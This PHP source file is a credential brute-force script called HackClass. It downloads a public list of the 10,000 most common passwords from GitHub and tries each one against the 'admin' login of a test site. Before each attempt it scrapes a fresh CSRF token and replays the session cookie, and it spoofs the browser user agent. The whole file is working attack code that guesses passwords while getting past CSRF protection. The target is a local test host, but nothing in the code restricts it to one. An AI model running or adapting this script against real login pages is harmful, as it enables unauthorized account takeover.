<?php
class HackClass{

    private static $tokenpage = 'http://test.loc';
    private static $attackpage = 'http://test.loc/submit.php';
    private static $username      = 'admin';

    public function index()
    {

        $passwords = $this->passwords_list();

        foreach($passwords as $password)
        {
            $token = $this->scrapcsrftoken();

            echo 'Trying with username - admin and password - '.$password.' and token - '.$token.', printing response: ';

            echo $this->hackpostlogin(self::$username, $password, $token);

            echo '<hr>';
        }
    }

    private function scrapcsrftoken()
    {
        $strCookie = 'PHPSESSID='. $_COOKIE['PHPSESSID'] .'; path=/';
        $agent= 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322)';
        $ch = curl_init();  // Initialising cURL
        curl_setopt($ch, CURLOPT_URL, self::$tokenpage);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
        curl_setopt($ch, CURLOPT_USERAGENT, $agent);
        curl_setopt( $ch, CURLOPT_COOKIE, $strCookie );
        $data = curl_exec($ch);
        curl_close($ch);
        $string = explode('value=',explode('/>',explode('name="token"',$data)[1])[0])[1];
        $token = str_replace('"', '', $string);
        $token = str_replace("'", '', $token);
        $token = trim($token);

        if( ! $token ) die('Can not scrap token');

        return $token;
    }

    private function hackpostlogin($username, $password, $token)
    {
        $strCookie = 'PHPSESSID='. $_COOKIE['PHPSESSID'] .'; path=/';
        $agent= 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322)';
        $headers[] = 'csrf:' .  self::$tokenpage;

        $ch = curl_init();

        curl_setopt($ch, CURLOPT_URL,self::$attackpage);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,
            "username=".$username."&password=".$password."&token=".$token);
        curl_setopt($ch, CURLOPT_USERAGENT, $agent);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

        curl_setopt( $ch, CURLOPT_COOKIE, $strCookie );
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

        $server_output = curl_exec($ch);

        curl_close ($ch);

        return $server_output;
    }

    //get passwords from github list
    private function passwords_list()
    {
        $curl = curl_init('https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-10000.txt');
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, TRUE);
        curl_setopt($curl,CURLOPT_USERAGENT,'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.13) Gecko/20080311 Firefox/2.0.0.13');

        $page = curl_exec($curl);

        $passwords_in_array = preg_split('/\r\n|\r|\n/', $page);
        return $passwords_in_array;
    }

}